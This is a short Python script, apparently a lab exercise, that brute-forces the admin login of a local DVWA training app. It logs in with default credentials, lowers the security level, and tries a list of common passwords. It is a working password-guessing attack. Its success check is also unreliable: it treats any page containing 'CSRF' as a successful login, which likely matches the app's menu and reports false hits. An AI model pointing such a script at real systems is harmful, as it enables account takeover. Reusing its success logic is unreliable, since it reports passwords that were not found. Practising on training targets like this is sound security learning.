#!/usr/bin/env python3
import requests

print("STARTING BRUTEFORCE")
print("-" * 40)

# Создаем сессию
s = requests.Session()

# 1. Логинимся в DVWA
print("[1] Logging in...")
s.post("http://127.0.0.1/login.php", 
       data={'username':'admin','password':'password','Login':'Login'})

# 2. Ставим low security
print("[2] Setting low security...")
s.post("http://127.0.0.1/security.php",
       data={'security':'low','seclev_submit':'Submit'})

# 3. Пробуем 5 самых вероятных паролей
print("[3] Testing passwords...")

passwords = ['password', '123456', 'admin', 'abc123', 'letmein']

for pwd in passwords:
    print(f"Trying: admin:{pwd}")
    
    # Делаем запрос
    r = s.get(f"http://127.0.0.1/vulnerabilities/brute/?username=admin&password={pwd}&Login=Login")
    
    # Проверяем ДВА варианта:
    # 1. Если есть "Welcome" - успех
    # 2. Если есть "CSRF" - тоже успех (в DVWA так)
    if "Welcome" in r.text or "CSRF" in r.text:
        print(f"\n" + "!" * 50)
        print(f"FOUND: admin / {pwd}")
        print("!" * 50)
        break
    else:
        print(f"  No")

print("\nDONE")
